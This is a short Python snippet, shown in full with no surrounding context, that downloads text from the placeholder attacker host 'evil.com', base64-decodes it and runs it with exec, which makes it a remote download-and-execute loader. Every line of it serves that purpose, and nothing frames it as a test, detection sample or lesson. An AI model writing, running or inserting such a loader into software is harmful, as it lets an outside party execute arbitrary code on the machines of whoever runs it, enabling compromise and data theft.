import requests
import base64
code = requests.get('http://evil.com/payload').text
exec(base64.b64decode(code))